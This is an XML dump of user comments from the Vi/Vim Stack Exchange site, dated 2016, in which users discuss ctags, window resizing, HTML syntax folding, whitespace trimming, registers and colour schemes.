  <row Id="13332" PostId="8015" Score="0" Text="2. You mention Universal Ctags, JSCtags, and the mostly unrelated tern_for_vim, but you show a convoluted JSCtags example and your `~/.ctags` file. **So… is your question about JSCtags or about Universal Ctags?**" CreationDate="2016-05-28T19:23:14.287" UserId="54" />
  <row Id="13333" PostId="8015" Score="0" Text="3. Vim expects your `tags` file to adhere to a specific format described in `:help ctags`. **Does the output of your shell command fit that format?**" CreationDate="2016-05-28T19:24:06.900" UserId="54" />
  <row Id="13334" PostId="8015" Score="0" Text="4. You can use `:echo taglist(&quot;.&quot;)` to output what Vim could put together from the files in `tagfiles()`. **Can you find your objects/methods, there?**" CreationDate="2016-05-28T19:24:26.667" UserId="54" />
  <row Id="13335" PostId="8016" Score="1" Text="1) Could you provide more detail on what you mean by &quot;The tabA goes black&quot;&#xA;&#xA;2) If you cycle through the tabs with `gt` and `gT` does the same issue show up?" CreationDate="2016-05-28T20:27:05.533" UserId="6590" />
  <row Id="13336" PostId="8016" Score="0" Text="How are you able to close other tabs from current tab?" CreationDate="2016-05-29T05:11:38.140" UserId="7161" />
  <row Id="13337" PostId="8017" Score="3" Text="Always ask Vim first: `:help window-resize`. By the way, the mouse is *a lot* more practical in this case." CreationDate="2016-05-29T08:46:48.703" UserId="54" />
  <row Id="13338" PostId="8017" Score="0" Text="Closely related to http://stackoverflow.com/questions/4368690/how-to-increase-the-vertical-split-window-size-in-vim" CreationDate="2016-05-29T08:50:39.043" UserId="7161" />
  <row Id="13339" PostId="8017" Score="0" Text="Closely related to http://stackoverflow.com/questions/12059335/changing-the-size-of-the-split-screen-in-vimdiff" CreationDate="2016-05-29T08:51:06.293" UserId="7161" />
  <row Id="13340" PostId="52" Score="1" Text="@SibiCoder: Because even the same filetype can have different indenting styles across different projects. (eg: projects not belonging to the same company)" CreationDate="2016-05-29T08:51:48.153" UserId="53" />
  <row Id="13342" PostId="52" Score="0" Text="`*.*` is just a pattern. You can use filename or path as well. Or, you can use similar auto command like what I gave, for each file. You can instruct the auto command to take the tabwidth of current file and put it for path of this file. Its pretty easy." CreationDate="2016-05-29T09:10:54.883" UserId="7161" />
  <row Id="13345" PostId="8016" Score="3" Text="Also do you reproduce the behavior when starting vim without your `.vimrc` (̀`vim -u NONE`)? (@SibiCoder see [the doc](http://vimdoc.sourceforge.net/htmldoc/tabpage.html#:tabclose): `:tabclose` accepts an argument)" CreationDate="2016-05-29T16:10:33.427" UserId="1841" />
  <row Id="13346" PostId="1958" Score="0" Text="Not a solution to the non-zero exit code, but to add to this, this Silent command allows commands like `:Silent ctags -R . &gt; /dev/null &amp;` to run in the background. Sending stdout to /dev/null prevents output from appearing in the vim buffer." CreationDate="2016-05-29T18:02:03.263" UserId="7811" />
  <row Id="13348" PostId="8021" Score="0" Text="This question was cross-posted to StackOverflow (no response at the time of this writing) : http://stackoverflow.com/questions/37514018/function-name-completion-from-local-header-file-not-working-with-youcompleteme-o" CreationDate="2016-05-30T09:35:04.333" UserId="7813" />
  <row Id="13350" PostId="8016" Score="0" Text="You can probably refresh with Control-L which would at least save you from selecting everything, assuming it works. ;)" CreationDate="2016-05-30T15:09:21.687" UserId="630" />
  <row Id="13351" PostId="2333" Score="0" Text="Hey Ingo, I am not sure if I am doing anything wrong, but there is no way I can get any HTML folding based on syntax method, nothing happens? I have an `expr` custom method which I use, however that disabled syntax folding for css and javascript.  When using `syntax` javascript and css have folds as expected but none of the HTML tags do? Any ideas?" CreationDate="2016-05-30T20:27:49.130" UserId="3334" />
  <row Id="13352" PostId="8025" Score="0" Text="Are you sure? It seems to be working fine for me, with your example using the default sh.vim syntax highlighter. What is your Vim version?" CreationDate="2016-05-31T01:52:01.987" UserId="246" />
  <row Id="13353" PostId="8025" Score="0" Text="@akshay Yes I'm sure, but TBH I was a it surprised that it would fail on a relatively common usage case. Here is a [screenshot](https://i.imgur.com/3onPc9e.png). I'm using `Vim 7.4 (2013 Aug 10, compiled Apr 29 2016 11:28:12); Included patches: 1-1797` on Arch Linux. I'm using `sh.vim` version 147, but I tried the very latest and still have this problem." CreationDate="2016-05-31T02:04:10.010" UserId="1278" />
  <row Id="13354" PostId="8025" Score="0" Text="Hmm, it seems to work fine for me, although I am using version 151: Here's a [screenshot](https://i.imgur.com/WiaCw6g.png) from my end." CreationDate="2016-05-31T02:09:54.713" UserId="246" />
  <row Id="13355" PostId="8025" Score="0" Text="@akshay Yes, version 151 was the one I tested too (and also failed). Good to know that it can work though. I wonder why that could be. Preferably I'd just like to get the default working, so I'll edit the question. Thanks for the help so far!" CreationDate="2016-05-31T02:12:02.127" UserId="1278" />
  <row Id="13356" PostId="8025" Score="4" Text="Use the vim_use mailing list to contact the maintainer of that script. He is usually pretty reactive." CreationDate="2016-05-31T05:30:01.690" UserId="54" />
  <row Id="13357" PostId="8022" Score="0" Text="This doesn't seem to work. I'm using syntastic, maybe that matters?" CreationDate="2016-05-31T05:57:59.543" UserId="2598" />
  <row Id="13358" PostId="8021" Score="0" Text="Do you *absolutely* need completion to be automatic? Vim's `&lt;C-n&gt;` and `&lt;C-x&gt;&lt;C-i&gt;` work out of the box. Anyway, use the plugin's issue tracker." CreationDate="2016-05-31T06:03:18.733" UserId="54" />
  <row Id="13359" PostId="8022" Score="0" Text="Can you give `:verbose hi Search` in command line? So that we can check whether the color is changed by syntactic or any other plugin?" CreationDate="2016-05-31T06:26:25.113" UserId="7161" />
  <row Id="13360" PostId="8025" Score="0" Text="Thanks @romainl. Good idea. (I just emailed him instead, so I don't have to subscribe to a mailing list.)" CreationDate="2016-05-31T06:30:31.070" UserId="1278" />
  <row Id="13361" PostId="2333" Score="1" Text="@zanona: Are the HTML tags properly colored? Sometimes a bad CSS or JavaScript element breaks syntax for the remainder of the document. The [SyntaxAttr.vim - Show syntax highlighting attributes of character under cursor](http://www.vim.org/scripts/script.php?script_id=383) plugin helps with troubleshooting. Check the syntax group of the (failing to fold) HTML tag, then check that the corresponding syntax rule has `fold` in it." CreationDate="2016-05-31T06:45:48.610" UserId="970" />
  <row Id="13362" PostId="8025" Score="0" Text="Just to confirm, was the detected filetype `sh`? What's the output of `scriptnames`, after you open that file?" CreationDate="2016-05-31T07:08:35.130" UserId="205" />
  <row Id="13363" PostId="8025" Score="0" Text="@muru I've updated the question." CreationDate="2016-05-31T08:27:21.920" UserId="1278" />
  <row Id="13364" PostId="8021" Score="0" Text="I know about &lt;C-n&gt; (and the corresponding functionality in YCM works for me), but I want to avoid wasting my time looking up function names. There is no direct evidence that this is a bug, so the issue tracker is inappropriate. I have cross-posted on the YCM mailing list, but it does not seem to be used much. There are many other YCM questions here - I can't find a page with the guidelines for this stack exchange site to tell if this question is out of scope." CreationDate="2016-05-31T09:01:45.393" UserId="7813" />
  <row Id="13365" PostId="8021" Score="0" Text="My point is that you won't get much help here. Just like all the other people who posted YCM related questions here." CreationDate="2016-05-31T09:56:45.690" UserId="54" />
  <row Id="13366" PostId="8026" Score="7" Text="A map might work: `inoremap ... \ldots`. Since one of the main benefits of abbreviations is Vim avoiding middle-of-word expansions, I suppose this qualifies for a map." CreationDate="2016-05-31T10:36:40.357" UserId="205" />
  <row Id="13367" PostId="8021" Score="0" Text="There are plenty of YCM-related questions here with accepted answers." CreationDate="2016-05-31T10:39:16.057" UserId="7813" />
  <row Id="13368" PostId="8022" Score="0" Text="It says `Last set from /usr/share/vim/vim74/colors/morning.vim`; the command doesn't seem to be called at all." CreationDate="2016-05-31T11:39:12.480" UserId="2598" />
  <row Id="13369" PostId="8022" Score="0" Text="Can you put the auto command line in a plugin inside `after` directory? This plugin may be created like /home/username/.vim/after/plugin/pluginname.vim if you don't have this yet. That might work." CreationDate="2016-05-31T12:10:18.497" UserId="7161" />
  <row Id="13370" PostId="8022" Score="0" Text="I tried, but the result is the same, unfortunately." CreationDate="2016-05-31T12:15:45.050" UserId="2598" />
  <row Id="13371" PostId="8022" Score="0" Text="It seems to work in my vim. Probably, you need to debug your plugins or create a issue in plugin's issue tracker (might be in github)" CreationDate="2016-05-31T12:27:26.210" UserId="7161" />
  <row Id="13372" PostId="8022" Score="0" Text="Okay, I will check what plugins are causing this later. Just to be sure, you are using syntastic?" CreationDate="2016-05-31T12:28:53.660" UserId="2598" />
  <row Id="13373" PostId="8022" Score="0" Text="Not using the plugin" CreationDate="2016-05-31T12:32:06.153" UserId="7161" />
  <row Id="13374" PostId="8026" Score="0" Text="[This](http://vi.stackexchange.com/questions/6391/backspace-in-insert-abbreviation) question may come in handy." CreationDate="2016-05-31T13:49:12.050" UserId="6698" />
  <row Id="13375" PostId="8015" Score="0" Text="@romainl. Thanks for the thoughts and sorry for the confusing information. I'm new to tagging in vim :-). Overall the objective is how to get tags to show up in Tagbar so I can have an overview and easy navigation of my file. Universal ctags and jsctags are apparently used by tagbar to auto-generate the tags (at least that's what I understood). If that's not possible then to use Vim's native tag functionality." CreationDate="2016-05-31T14:04:54.473" UserId="7800" />
  <row Id="13376" PostId="8015" Score="0" Text="@romainl `echo taglist(&quot;.&quot;)` prints out a huge list of tags that I don't know how to search within so I tried looking for a specific method like `:tag processLiveData` with no luck. Also, I'm not able to run `:help ctags` so I'm not sure what format you're referring to. There are definitely tags being generated for some files but not all. No difference in syntax of the files, but it's strange that my lib/ folder is getting tagged yet the folder with all my work files (widgets/) is not..." CreationDate="2016-05-31T14:27:28.203" UserId="7800" />
  <row Id="13377" PostId="8028" Score="0" Text="I think OP wants to run only on any one window of multiple windows to the same buffer." CreationDate="2016-05-31T14:57:22.877" UserId="205" />
  <row Id="13378" PostId="8015" Score="0" Text="Tagbar uses *either* ctags *or* jsctags. Which one it uses is probably defined by some option described somewhere in `:help tagbar`. What tags you have listed in the Tagbar window *may or may not be the same seen by Vim itself.* The operation of tags in Vim is totally separated from that in Tagbar so using one for debugging the other makes no sense at all." CreationDate="2016-05-31T14:59:16.857" UserId="54" />
  <row Id="13379" PostId="8030" Score="2" Text="&quot;similar to other IDE's&quot; Vim has never been, is not, can't be, will never be an IDE or even an alternative to an IDE. Use an IDE if you need IDE features. Also, what do you call &quot;injected objects&quot;? The whole point of tern is to provide &quot;smart&quot; completion. If it doesn't, describe what you want and/or use their issue tracker." CreationDate="2016-05-31T15:04:09.713" UserId="54" />
  <row Id="13380" PostId="8028" Score="0" Text="@muru, Then, the function needs to be called only on visible buffers (instead on all windows), the window list becomes: `sort(filter(map(range(1, bufnr('$')), 'bufwinnr(v:val)'), 'v:val &gt;= 0'))`. &#xA;But I'm not sure this is what he's looking for either as `matchadd()` is window-wise, not buffer-wise -- i.e. when executed on a buffer in a window, it has no effect on the same buffer when displayed in another window." CreationDate="2016-05-31T15:37:08.463" UserId="626" />
  <row Id="13381" PostId="8031" Score="1" Text="Instead of `g/\s\+$/s///e`, why not simply `%s/\s\+$//e`?" CreationDate="2016-05-31T16:35:05.370" UserId="21" />
  <row Id="13382" PostId="8031" Score="0" Text="@KarlYngveLervåg It was to stay on the topic of only dealing with affected lines." CreationDate="2016-05-31T17:20:42.887" UserId="5229" />
  <row Id="13383" PostId="8031" Score="1" Text="There's no difference between `:g/\s\+$/s///e` and `:%s/\s\+$//e` in your example because `:g` is going to execute on the entire buffer.  You've done nothing to restrict it to just the lines that have been modified." CreationDate="2016-05-31T18:33:37.133" UserId="15" />
  <row Id="13384" PostId="8031" Score="1" Text="@KarlYngveLervåg I went ahead and updated the answer using `:%s`" CreationDate="2016-05-31T18:41:22.257" UserId="5229" />
  <row Id="13385" PostId="8031" Score="0" Text="@jamessan Right.  But, I wanted to illustrate search -&gt; action.  The answer is updated with what I actually use for cleaning trailing whitespace." CreationDate="2016-05-31T18:49:34.687" UserId="5229" />
  <row Id="13386" PostId="7892" Score="0" Text="When I open the `netrw.vim` file, and search for `nonu`, and I find commands like `setlocal nonu`. When I change it to `nu`, netrw can display line number as I expect. Please mention the change of netrw.vim in your answer so that I can accept your answer." CreationDate="2016-05-31T19:03:25.633" UserId="1080" />
  <row Id="13387" PostId="8031" Score="0" Text="The two-autocmds solution touches unmodified lines, which is unsuitable for me. However, `'[` and `']` marks do work, thanks!" CreationDate="2016-05-31T19:23:02.307" UserId="7826" />
  <row Id="13388" PostId="8031" Score="0" Text="To clarify: doing an autocmd on `InsertLeave` would've been easier, but I want to keep those spaces until before saving the file." CreationDate="2016-05-31T19:27:31.003" UserId="7826" />
  <row Id="13389" PostId="7892" Score="0" Text="I thought you said that you couldn't update netrw. If you can edit netrw.vim then you can surely update netrw. I would recommend updating netrw before editing it... I'll add this to my answer when I get to a computer." CreationDate="2016-05-31T19:32:45.423" UserId="6489" />
  <row Id="13390" PostId="8031" Score="0" Text="@intelfx Are the files you're editing enormous?  I don't completely understand the aversion to `%s/\s\+$//e`.  But, you could track affected lines by using something like `'[,']g/\s\+$/call AddStripLine(line('.'))`" CreationDate="2016-05-31T19:36:23.627" UserId="5229" />
  <row Id="13392" PostId="8031" Score="0" Text="@TommyA To clarify further: my concern is avoiding polluting diffs with unrelated changes. Some of the projects I work on have a legacy codebase where nobody paid attention to trimming whitespace or otherwise formatting code." CreationDate="2016-05-31T19:49:49.983" UserId="7826" />
  <row Id="13393" PostId="2333" Score="0" Text="Thanks Ingo! I will try that out. I have tried many variations of starting with a fresh html file, removing all the plugins, etc but I still have no folding under HTML. I will have a look on the plugin you sent. Hopefully that will be able to help debugging. Thanks again for your help." CreationDate="2016-05-31T20:28:46.820" UserId="3334" />
  <row Id="13394" PostId="8028" Score="0" Text="I've clarified my question. I wrote it late last night and left out many details. It should hopefully be more clear what I'm going for." CreationDate="2016-05-31T21:01:49.973" UserId="7476" />
  <row Id="13395" PostId="8037" Score="1" Text="Clever! Why didn't I think of that. One more question: Sorry if this comes off as noobish, but why does this statement work without the final &quot;/&quot; in the replacement?" CreationDate="2016-05-31T22:30:09.447" UserId="7832" />
  <row Id="13396" PostId="8037" Score="1" Text="@JonathanEricsson No worries! We've all been a noob at one point. `:)` In general, the last slash is never necessary, unless you need to specify a flag, like `/g` or `/c`. You could even do just this: `:%s/,` and the will remove the first comma on every line." CreationDate="2016-05-31T22:32:35.833" UserId="2920" />
  <row Id="13397" PostId="8035" Score="1" Text="Did you read through [this](https://github.com/neovim/neovim/blob/master/runtime/doc/remote_plugin.txt#L7)?" CreationDate="2016-05-31T23:29:52.967" UserId="2920" />
  <row Id="13398" PostId="8039" Score="0" Text="+1 for simplicity. A lot better than my solution." CreationDate="2016-06-01T00:41:13.770" UserId="2920" />
  <row Id="13399" PostId="8035" Score="0" Text="I'm pretty sure you just define key maps that calls rpc methods.  A fairly complete use of the Python API can be seen in [deoplete.nvim](https://github.com/Shougo/deoplete.nvim).  You could also inspect the Python client's source code as well: https://github.com/neovim/python-client" CreationDate="2016-06-01T04:37:51.367" UserId="5229" />
  <row Id="13400" PostId="8026" Score="2" Text="@muru Ah, for some reason a regular `inoremap` isn't working for me, but now I tried it with `vim -u NONE` and it works perfectly, so it must be some plugin messing things up. Thanks! And thank you for the link, @jair, if I can't work it out with `inoremap` I'll go with one of those options." CreationDate="2016-06-01T06:12:28.050" UserId="7642" />
  <row Id="13401" PostId="8040" Score="1" Text="The part from `\ze` and on can be removed." CreationDate="2016-06-01T06:12:56.480" UserId="21" />
  <row Id="13402" PostId="8037" Score="3" Text="This could be simplified to `:%s/.*\zs,/|`." CreationDate="2016-06-01T06:13:19.827" UserId="21" />
  <row Id="13403" PostId="8042" Score="1" Text="Cool solution, but this won't work if the comma is the last character on the line, or if one of the lines doesn't have a comma." CreationDate="2016-06-01T06:16:21.050" UserId="2920" />
  <row Id="13404" PostId="8042" Score="0" Text="I will check once and try to cover them too." CreationDate="2016-06-01T06:18:32.067" UserId="7161" />
  <row Id="13409" PostId="8040" Score="1" Text="Hah, so obvious apres coup :)" CreationDate="2016-06-01T10:41:44.743" UserId="1800" />
  <row Id="13410" PostId="8041" Score="1" Text="Since you're using the lazy version, would `.\{-}` be enough?" CreationDate="2016-06-01T11:49:48.113" UserId="205" />
  <row Id="13411" PostId="8044" Score="0" Text="yeah, the one I posted in question was complicated and couldn't handle many cases..  yours does indeed work very well for sample text I gave, however it won't catch all cases, like `\* \#` etc.. thanks for different approach, something new to learn :)" CreationDate="2016-06-01T12:08:30.070" UserId="1616" />
  <row Id="13412" PostId="8048" Score="6" Text="try `:silent! argdo %s/foo/\rfoo/ge | update` ... `silent` skips displaying normal messages and `!` skips error messages as well" CreationDate="2016-06-01T13:15:03.843" UserId="1616" />
  <row Id="13413" PostId="8048" Score="2" Text="Related to http://superuser.com/questions/430843/use-argdo-with-search-pattern-to-delete-line-while-suppressing-errors-and-requir" CreationDate="2016-06-01T13:19:21.030" UserId="7161" />
  <row Id="13414" PostId="8048" Score="0" Text="awesome! Thanks. So, will someone post an answer? (@spasic) I guess it's better to have this question on vi.stackexchange even though the superuser one is very similar..." CreationDate="2016-06-01T14:23:08.480" UserId="7004" />
  <row Id="13415" PostId="8050" Score="2" Text="You'd better ask to the developer [here](https://github.com/ntpeters/vim-better-whitespace/issues)" CreationDate="2016-06-01T15:24:00.167" UserId="1841" />
  <row Id="13418" PostId="2333" Score="0" Text="Hey Ingo, I have just tested the plugin (which is great) leaving my `.vimrc` empty only having the plugin without any luck. I also recorded this session so you could see that there's no way to activate folds on HTML files. If you could please have a look at (https://asciinema.org/a/706m0t244k7qv7zsp7twwgs2c). Perhaps it's the version of Vim I am using (7.4) which may not have the HTML folding enabled? Please let me know your thoughts and thanks again for your help. Apparently CSS was working fine but the plugin didn't state any `fold` option on the output which is odd?" CreationDate="2016-06-01T15:37:32.407" UserId="3334" />
  <row Id="13419" PostId="8048" Score="0" Text="@spasic you answered the question in a comment. Please move this to an answer." CreationDate="2016-06-01T15:47:30.640" UserId="895" />
  <row Id="13420" PostId="8052" Score="0" Text="That feels like quite a hack though? Am I misunderstanding how autocmd/highlight works or is the plugin actually breaking something?" CreationDate="2016-06-01T16:12:50.150" UserId="7840" />
  <row Id="13422" PostId="8052" Score="0" Text="`listchars` is fully supported by vim. How is this a hack? I haven't looked at the plugin, as I don't feel like wading through code, but if you feel so inclined, you might check if it also defines the same `autocmd`. I was merely trying to provide you with a simpler way that might not interfere with the plugin." CreationDate="2016-06-01T16:37:06.270" UserId="6489" />
  <row Id="13423" PostId="8056" Score="1" Text="I'm pretty sure if you wipe a buffer, any buffer-local autocmds get wiped too." CreationDate="2016-06-01T17:47:45.310" UserId="6489" />
  <row Id="13424" PostId="8056" Score="0" Text="@Tumbler41 indeed. It does say that in the help, a few paragraphs down." CreationDate="2016-06-01T17:49:06.687" UserId="205" />
  <row Id="13425" PostId="8056" Score="1" Text="Not exactly what you asked, but `up` (short for `:update`) would be better than `w` in your autocmd (avoid unnecessary writes)." CreationDate="2016-06-01T18:09:45.277" UserId="1405" />
  <row Id="13426" PostId="8056" Score="0" Text="@mMontu Nice. It even solves a problem I had when the autocmd activated for an a file I was examining from git history. The buffer was readonly, and `w` failed. *Repeatedly.* `:up` doesn't do anything in that case. :)" CreationDate="2016-06-01T18:11:51.923" UserId="205" />
  <row Id="13427" PostId="8056" Score="0" Text="Glad you liked :) Incidentally, you could also find the 'autowrite' option useful (depending on your motivation, you could drop the autocmds)." CreationDate="2016-06-01T18:13:42.360" UserId="1405" />
  <row Id="13428" PostId="8030" Score="0" Text="Injected objects I'm meaning as the dependency injection found at the top of the file when you have define(['jquery'], function($){}). $ represents the inject jquery object that is injected into my function scope. Tern does not resolve the injected objects, thus failing (in what I think should be) in it's &quot;smart&quot; completion. And that's what I'm asking, is it possible to configure Tern to provide &quot;smart&quot; completion for these injected objects so that I can see what methods are available for that object?" CreationDate="2016-06-01T19:58:59.533" UserId="7800" />
  <row Id="13429" PostId="8015" Score="0" Text="Right. tagbar is calling jsctags with no errors printing within it's debugging log. Vim also uses the tags file generated by ctags or jsctags for it's tag functionality so no, I didn't think that using one to debug the other was such a stretch but I understand why that may lead to false positives." CreationDate="2016-06-01T20:06:28.870" UserId="7800" />
  <row Id="13430" PostId="8030" Score="0" Text="IIRC you had to include those modules to your tern config file but that was a long time ago." CreationDate="2016-06-01T20:09:22.950" UserId="54" />
  <row Id="13431" PostId="8028" Score="0" Text="I think your example in scenario 1 should work for what I want. In fact, `w:matchId` can just be a boolean since we don't need to use the return value from `matchadd()` for anything." CreationDate="2016-06-01T20:17:53.203" UserId="7476" />
  <row Id="13432" PostId="8028" Score="0" Text="The only caveat I see with this method is it involves checking the existence of a variable every time a window is entered. This seems like an unnecessary cost given that all I want to do is declare that every window should have this effect. Is there no declarative way to do so? Just as with my method above, this seems like a roundabout way to achieve a functionality that should be declarative, rather than based on events and side effects." CreationDate="2016-06-01T20:20:36.807" UserId="7476" />
  <row Id="13433" PostId="8058" Score="0" Text="How did you open this panel? I opened the `System Settings` at the task bar, and clicked the `Color` icon, it listed the monitor device and and a `Add profile` button. What's next?" CreationDate="2016-06-02T00:26:07.173" UserId="1080" />
  <row Id="13434" PostId="6966" Score="0" Text="Hi, I set up that exact mapping, but I'm pressing &lt;Esc&gt; and nothing happens. Any idea why?" CreationDate="2016-06-02T01:16:41.063" UserId="7848" />
  <row Id="13435" PostId="6966" Score="0" Text="if you add it from Ex mode are the results the same? might be updating the wrong config file.." CreationDate="2016-06-02T01:29:37.260" UserId="2189" />
  <row Id="13436" PostId="7881" Score="1" Text="@SibiCoder I think I prefer: ggqqj129dd@qq@q will do just as same as you do. I just managed to learn about this kind of stuff :)" CreationDate="2016-06-02T03:31:25.753" UserId="7575" />
  <row Id="13437" PostId="7879" Score="0" Text="@statox I just learn about that cryptic recursive command and I guess I can do qqj129dd@qq@q and it's prettier since I will see the command repeated on screen (not on background!)  :D&#xA;&#xA;Thanks for that." CreationDate="2016-06-02T03:35:50.497" UserId="7575" />
  <row Id="13438" PostId="8059" Score="2" Text="`y` is an operator, not a command." CreationDate="2016-06-02T06:10:05.180" UserId="54" />
  <row Id="13439" PostId="2333" Score="1" Text="@zanona: Thanks for the detailed analysis; I think I know now what the problem is. The default HTML syntax only does folding of multi-line tags itself, but you want folding of stuff in between opening and closing tags. That needs a simple extension of the syntax script; see my edit. I actually had this in my Vim config for so long that I forgot about it!" CreationDate="2016-06-02T06:20:00.623" UserId="970" />
  <row Id="13440" PostId="8057" Score="2" Text="1/ Not working as expected is one of the main features of solarized. 2/ If you need help about the setup of your terminal it would be useful to tell us which terminal emulator you're using." CreationDate="2016-06-02T07:24:27.187" UserId="1841" />
  <row Id="13441" PostId="8028" Score="0" Text="@fvargas Unless you issue a _Request for Change_ for a new `WinCreate` event, and use a vim version that implements it, I'm afraid there is no neat way to implement what you're looking for. Any way, I wouldn't play with register + unregister every time you change your window. I did something similar in my fork of buffer-menu -- to emulate `menu &lt;buffer&gt;`. The result works, but it's much too complex." CreationDate="2016-06-02T07:32:40.067" UserId="626" />
  <row Id="13442" PostId="8058" Score="0" Text="@user3813057 that's the terminal's profile preferences, not system settings." CreationDate="2016-06-02T07:34:13.547" UserId="205" />
  <row Id="13443" PostId="8028" Score="0" Text="@LucHermitte Indeed, a `WinCreate` event would work perfectly here. But I've found that using `WinEnter` as you suggested works as desired and does not introduce any duplicate match entries. So, although having to check the variable on every window switch is not ideal, I don't think it's really a big deal. Thanks for your help!" CreationDate="2016-06-02T08:40:53.220" UserId="7476" />
  <row Id="13444" PostId="8028" Score="0" Text="You're welcome." CreationDate="2016-06-02T08:59:08.497" UserId="626" />
  <row Id="13446" PostId="8064" Score="5" Text="http://stackoverflow.com/questions/704434/is-there-any-way-to-highlight-multiple-searches-in-gvim" CreationDate="2016-06-02T09:42:28.040" UserId="1616" />
  <row Id="13447" PostId="8066" Score="1" Text="Have you read [`:h :wincmd`](http://vimdoc.sourceforge.net/htmldoc/windows.html#:wincmd)? Does adding `wincmd k` solves your problem?" CreationDate="2016-06-02T12:03:56.233" UserId="1841" />
  <row Id="13448" PostId="8066" Score="0" Text="I tried with `wincmd` (http://stackoverflow.com/questions/8822237/vim-is-there-a-command-to-switch-windows) but it doesn't seem to work upon starting vim. Maybe an autocmd is needed there ? I can't find it so far..." CreationDate="2016-06-02T12:07:20.337" UserId="7128" />
  <row Id="13449" PostId="8066" Score="2" Text="No autocmd is needed: it does work for me. How did you include `wincmd` to your `.vimrc`? (Edit your question to show what you tried please)" CreationDate="2016-06-02T12:14:08.160" UserId="1841" />
  <row Id="13450" PostId="8069" Score="0" Text="I think 0 register is to store recently deleted/yanked text. As far as I know, Numbered registers cannot be mapped." CreationDate="2016-06-02T14:06:47.770" UserId="7161" />
  <row Id="13452" PostId="8066" Score="0" Text="I can reproduce it. If I start vim it doesn't work, but if I source the file it works fine. (Using gVim 7.4) Tried using an autocmd `autocmd VimEnter * wincmd j`. That works. Not sure why it wouldn't work straight from vimrc though." CreationDate="2016-06-02T15:09:48.353" UserId="6489" />
  <row Id="13454" PostId="8063" Score="0" Text="Knowing exactly what you want does not prevent you of maybe learning a new things with different solution. After all you don't know what you don't know... Timing in Vim is a sensible subject, and I think it's better to have a proper action that disable the highlight, hence the proposed solutions. But if you still want to have a timer, have a look at `:h timer_start()`." CreationDate="2016-06-02T16:30:42.083" UserId="1821" />
  <row Id="13455" PostId="2333" Score="0" Text="Wow That's simply Amazing Ingo! It worked immediately after I dropped this line there. thanks so much! I assume we can edit the element we want folded by simply adding to the tag names list? Would a catch all regex like `[\w-]` also work in case I want to fold all tags? Also, I was reading some tutorials on syntax and may I ask if on the `end` declaration `end=&quot;&lt;/\z1\_s*&gt;&quot;` the `\z1` is something like `$1` in other languages? However I see that you also created the group with `\z(...)`?  Thanks again for this great help. all the best" CreationDate="2016-06-02T16:34:42.667" UserId="3334" />
  <row Id="13456" PostId="8063" Score="0" Text="@nobe4 I agree with you in the general case, but in this specific very simple case there's nothing to learn. Especially after reading this http://stackoverflow.com/questions/22798473/vim-how-to-turn-off-search-highlight-after-timeout-x-seconds" CreationDate="2016-06-02T16:35:00.300" UserId="6634" />
  <row Id="13457" PostId="8063" Score="0" Text="Well, it seems that there is already a solution here, what do you want more?" CreationDate="2016-06-02T16:37:14.163" UserId="1821" />
  <row Id="13458" PostId="2333" Score="0" Text="Still amazed with the script!! I have tweaked it a little bit so it will fold everything but void html elements _(those which don't have a closing sibling)_: `syntax region htmlFold start=&quot;&lt;\z(\&lt;\(area\|base\|br\|col\|command\|embed\|hr\|img\|input\|keygen\|link\|meta\|para\|source\|track\|wbr\&gt;\)\@![a-z-]\+\&gt;\)\%(\_s*\_[^/]\?&gt;\|\_s\_[^&gt;]*\_[^&gt;/]&gt;\)&quot; end=&quot;&lt;/\z1\_s*&gt;&quot; fold transparent keepend extend containedin=htmlHead,htmlH\d` :D" CreationDate="2016-06-02T17:02:22.177" UserId="3334" />
  <row Id="13459" PostId="8058" Score="0" Text="@guntbert I'm using gnome term, at least the command `cat /etc/alternatives/x-terminal-emulator | grep exec` shows `exec('gnome-terminal',@args)`.  I've downloaded solarized color scheme from this (https://github.com/Anthony25/gnome-terminal-colors-solarized) link, and run the `./install.sh` command. However, when I open the palette, there is no `Solarized` option, and the vim in terminal still does not display as expected. What else shall I do?" CreationDate="2016-06-02T19:06:42.723" UserId="1080" />
  <row Id="13460" PostId="8057" Score="0" Text="How can I check what terminal I'm using? In the comment I left below (to the first answer), I list a command, and that command shows I'm using gnome. And I've downloaded the solarized scheme from this link (https://github.com/Anthony25/gnome-terminal-colors-solarized). What else shall I do? Thanks." CreationDate="2016-06-02T19:09:40.013" UserId="1080" />
  <row Id="13461" PostId="8063" Score="0" Text="@nobe4 I don't see any working solution there." CreationDate="2016-06-02T19:22:06.260" UserId="6634" />
  <row Id="13462" PostId="8065" Score="0" Text="Okay, I've tried your plugin and it tries to do what I want but fails. It fails on two things basically: disables highlight when leaving insert mode (it shouldn't do that, it should disable it if next n (by n I mean some natural number) isn't search related (like not ```n```, ```N```, or ```gn```) or disable after some time. Next thing it enables hightlight of previous search when typing ```/```. Again it shouldn't do that. It makes no sense at least to me. I don't want to see previous matches when starting new search. It's inconsistent with behaviour of manual ```:noh```" CreationDate="2016-06-02T19:28:25.227" UserId="6634" />
  <row Id="13463" PostId="8070" Score="3" Text="This is not possible. The whole line belongs to the `Folded` highlight group." CreationDate="2016-06-02T19:36:22.057" UserId="54" />
  <row Id="13464" PostId="8069" Score="0" Text="The 0 register store only the yanked, not the deleted text. This is why I wish to have it mapped to the clipboard. In my workflow outside vim, I use the clipboard for &quot;I want to keep this for some time&quot; and the primary selection for &quot;just select and paste somewhere without overwriting the clipboard&quot;. So I think it's natural to map the clipboard to the 0 register and the primary selection to the unnamed register." CreationDate="2016-06-02T21:09:29.227" UserId="5694" />
  <row Id="13467" PostId="8074" Score="0" Text="You can undo by pressing u." CreationDate="2016-06-03T03:52:32.117" UserId="7161" />
  <row Id="13468" PostId="8074" Score="0" Text="Another way is to check with an autocommand" CreationDate="2016-06-03T03:52:51.307" UserId="7161" />
  <row Id="13469" PostId="8074" Score="0" Text="in Insert mode, it doesn't matter where your mouse is pointing.. it will paste where the cursor is" CreationDate="2016-06-03T05:16:52.823" UserId="1616" />
  <row Id="13470" PostId="8074" Score="1" Text="Simple: don't paste with the mouse." CreationDate="2016-06-03T05:17:52.110" UserId="54" />
  <row Id="13471" PostId="2333" Score="1" Text="@zanona: Thanks! Your idea of reversing the selection criteria for the HTML tags adds a nice touch. I've added that to the answer as a (better) alternative." CreationDate="2016-06-03T07:00:03.807" UserId="970" />
  <row Id="13472" PostId="8074" Score="0" Text="Maybe you need the opposite (`set mouse=a` or similar) and check your terminal/x mouse settings instead." CreationDate="2016-06-03T07:03:16.960" UserId="1800" />
